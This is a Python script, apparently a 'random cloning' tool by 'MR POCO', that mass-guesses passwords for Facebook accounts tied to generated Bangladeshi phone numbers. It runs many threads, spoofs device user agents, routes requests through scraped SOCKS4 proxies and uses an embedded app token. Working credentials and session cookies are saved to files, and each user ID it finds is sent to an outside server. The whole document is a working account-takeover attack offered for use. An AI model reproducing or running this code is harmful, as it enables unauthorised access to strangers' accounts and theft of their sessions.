#-*-coding:utf-8-*-
#!/usr/bin/python3
#!/coding by mr poco
#-----------------------[ IMPORT-CODE ]-----------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,marshal,base64,zlib,urllib,subprocess
from datetime import datetime
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
#-----------------------[ PROXY-CODE ]-----------------------#
try:prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text;open('Proksi.txt','w').write(prox)
except Exception as e:print(e)
#-----------------------[ COLOUR-CODE ]-----------------------#
green='\033[1;32m';white='\033[1;37m';ping='\x1b[38;5;208m';yellow='\x1b[38;5;226m';red='\x1b[38;5;196m';xd=f' {red}[{white}={red}]{green}';xd1=f' {red}[{white}1{red}]{green}';xd2=f' {red}[{white}2{red}]{green}';xd0=f' {red}[{white}0{red}]{green}';xdx=f' {red}[{white}?{red}]{green}';xdxx=f'{red}:{green}'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];cpx=[];plist=[];loop=0;ugen=[]
#-----------------------[ GRAPH METHOD UA ]-----------------------#
def oppouaa():
	density = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])
	model = random.choice(['CPH2071','CPH2083','CPH2185','CPH2269','CPH2349'])
	mobile_version = random.choice(['9','10','11','12'])
	ua1 = '[FBAN/FB4A;FBAV/521.0.0.42.97;FBBV/463220692;FBDM/'+density+';FBLC/en_GB;FBRV/348304748;FBCR/Banglalink;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+mobile_version+';FBOP/1;FBCA/arm64-v8a:;]'
	ua2 = '[FBAN/FB4A;FBAV/504.0.0.69.64;FBBV/459818651;FBDM/'+density+';FBLC/en_GB;FBRV/348304748;FBCR/Robi;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+mobile_version+';FBOP/1;FBCA/arm64-v8a:;]'
	ua3 = '[FBAN/FB4A;FBAV/509.0.0.67.28;FBBV/460813370;FBDM/'+density+';FBLC/en_GB;FBRV/348304748;FBCR/Beeline KZ;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+mobile_version+';FBOP/1;FBCA/arm64-v8a:;]'
	ua4 = '[FBAN/FB4A;FBAV/513.1.0.66.92;FBBV/461627716;FBDM/'+density+';FBLC/bl_bd;FBRV/348304748;FBCR/Beeline KZ;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+mobile_version+';FBOP/1;FBCA/arm64-v8a:;]'
	ua5 = '[FBAN/FB4A;FBAV/511.0.0.73.36;FBBV/347007278;FBDM/'+density+';FBLC/bl_bd;FBRV/348304748;FBCR/Beeline KZ;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+mobile_version+';FBOP/1;FBCA/arm64-v8a:;]'
	mix_uaa = random.choice([ua1,ua2,ua3,ua4,ua5])
	return mix_uaa
def mozilauaaa():
	ua1 = 'Mozilla/5.0 (Linux; Android 15; RMX5303 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.68 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 14; RMX3636 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36'
	mix_uaa = random.choice([ua1,ua2])
	return mix_uaa
#-----------------------[ HOST METHOD UA ]-----------------------#
ugen=[]
#-----------------------[ SYS-CODE ]-----------------------#
sys.stdout.write('\x1b]2; [MR POCO] \x07')
#-----------------------[ CLEAR-CODE ]-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{white}{"-" * 50}')
#-----------------------[ LOGO-BOX ]-----------------------#
logo = f'''
      {white}M{green}┏━┓┏━┓┏━╸┏━┓ {red}•{green} OWNER {xdxx} MR POCO
      {red}R{green}┣━┛┃ ┃┃  ┃ ┃ {red}•{green} TOOLS {xdxx} RANDOM CLONING
       {green}╹  ┗━┛┗━╸┗━┛ {red}•{green} VERSION {xdxx} 0.0
{white}{"-" * 50}'''
#-----------------------[ MENU-BOX ]-----------------------#
def poco_menu():
    clear();print(f"{xd1} BANGLADESH RANDOM CLONING ");print(f"{xd0} EXIT RANDOM CLONING ");linex();option=input(f"{xdx} INPUT OPTION {xdxx} ")
    if option == '1':bdcloning()
    elif option == "0":exit()
    else:exit(f'{xd} OPTION NOT FOUND ');time.sleep(2);poco_menu()
#-----------------------[ IMPORT-CODE ]-----------------------#
def bdcloning():
	clear();print(f"{xd} EXAMPLE {xdxx} 016 {red}|{green} 017 {red}|{green} 018 {red}|{green} 019 ");linex();code=input(f"{xdx} INPUT CODE {xdxx} ");linex();print(f"{xd} EXAMPLE {xdxx} 3000 {red}|{green} 5000 {red}|{green} 10000 {red}|{green} 99999 ");linex();limit=int(input(f"{xdx} INPUT LIMIT {xdxx} "));clear();print(f'{xd1} METHOD M1 {red}[{white}GRAPH{red}]{green} ');print(f'{xd2} METHOD M2 {red}[{white}HOST{red}]{green} ');linex();methd=input(f"{xdx} INPUT METHOD {xdxx} ");clear();print(f'{yellow}            DO YOU WENT SHOW CP ID ');linex();oposs=input(f"{xdx} INPUT {red}[{white}y{red}|{white}n{red}] {xdxx} ")
	if oposs in ['y','Y','yes','Yes','1']:cpx.append('y')
	else:cpx.append('n')
	for pronhub in range(limit):oxoxo = ''.join(random.choice(string.digits) for _ in range(8));user.append(oxoxo)
	with tred(max_workers=30) as crack_zone:
		clear();tl=str(len(user))
		print(f'{xd} OPERATOR{red}|{green}LIMIT{red}|{green}METHOD {xdxx}{white} {code}{red}|{white}{tl}{red}|{white}M{methd}');print(f'{xd} IF NO RESULT {red}[{white}ON{red}|{white}OFF{red}]{green} AIRPLANE MODE ');linex()
		for love in user:
			ids = code + love
			pasx = [ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
			#pasx = [love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','iloveyou','bangladesh']
			if methd == "1":crack_zone.submit(rndmone,ids,pasx,tl)
			elif methd == "2":crack_zone.submit(rndmtwo,ids,pasx,tl)
			else:crack_zone.submit(rndmone,ids,pasx,tl)
	print(f'\r\r{white}{"-" * 50}');print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK{red}|{green}CP IDS :{white} '+str(len(ok))+'|'+str(len(cp)));print(f'\r\r{white}{"-" * 50}');exit()
#-----------------------[ METHOD M1 GRAPH ]-----------------------#
def rndmone(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r{xd}{white}-{red}[{green}POCO-XD{red}]{white}-{red}[{white}{loop}{red}]{white}-{red}[{green}{len(ok)}{red}]{white}-{red}[{ping}{len(cp)}{red}] ');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': oppouaa(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                cookies = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                lkremoveurl = str(requests.get(f"https://mrpoco.pythonanywhere.com/live?uid={str(uid)}").text)
                                if 'LIVE' in lkremoveurl:
                                	print(f'\r{xd}{white}-{red}[{green}POCO-OK{red}]{green} {str(uid)} | {pas} ')
                                	print(f'\r{xd}{white}-{red}[\U0001F36A{red}]{white} {cookies} ');print('')
                                	open('/sdcard/MR-POCO-RNDM-M1-OK-IDS.txt','a').write(str(uid)+'|'+pas+'|'+cookies+'\n')
                                	ok.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{xd}{white}-{red}[{ping}POCO-CP{red}]{ping} {str(uid)} | {pas} ')
                                open('/sdcard/MR-POCO-RNDM-M1-CP-IDS.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#-----------------------[ METHOD M2 HOST ]-----------------------#
def rndmtwo(ids,pasx,tl):
	global loop,ok,cp
	sys.stdout.write(f'\r{xd}{white}-{red}[{green}POCO-XD{red}]{white}-{red}[{white}{loop}{red}]{white}-{red}[{green}{len(ok)}{red}]{white}-{red}[{ping}{len(cp)}{red}] ');sys.stdout.flush()
	ewe = requests.Session()
	ua = mozilauaaa()
	for pas in pasx:
		try:
			xxcc = open('Proksi.txt','r').read().splitlines()
			zzxx = {'http': 'socks4://'+random.choice(xxcc)}
			link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"m_ts": re.search(r'name="m_ts" value="(.*?)"', str(link)).group(1),"li": re.search(r'name="li" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1),"lsd": re.search(r'name="lsd" value="(.*?)"', str(link)).group(1)}
			headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)\.', str(ua)).group(1),re.search(r'Chrome/(\d+)\.', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search(r'name="lsd" value="(.*?)"', str(link)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects=False,proxies=zzxx)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				if 'y' in cpx:print(f'\r{xd}{white}-{red}[{ping}POCO-CP{red}]{ping} {str(uid)} | {pas} ')
				open('/sdcard/MR-POCO-RNDM-M2-CP-IDS.txt','a').write(str(uid)+'|'+pas+'\n')
				cp.append(str(uid))
				break
			elif "c_user" in ewe.cookies.get_dict():
				cookies = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', cookies)[0]
				lkremoveurl = str(requests.get(f"https://mrpoco.pythonanywhere.com/live?uid={str(uid)}").text)
				if 'LIVE' in lkremoveurl:
					print(f'\r{xd}{white}-{red}[{green}POCO-OK{red}]{green} {str(uid)} | {pas} ')
					print(f'\r{xd}{white}-{red}[\U0001F36A{red}]{white} {cookies} ');print('')
					open('/sdcard/MR-POCO-RNDM-M2-OK-IDS.txt','a').write(str(uid)+'|'+pas+'|'+cookies+'\n')
					ok.append(str(uid))
					break
				else:continue
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#-----------------------[ END-CODE ]-----------------------#
if __name__=='__main__':
	poco_menu()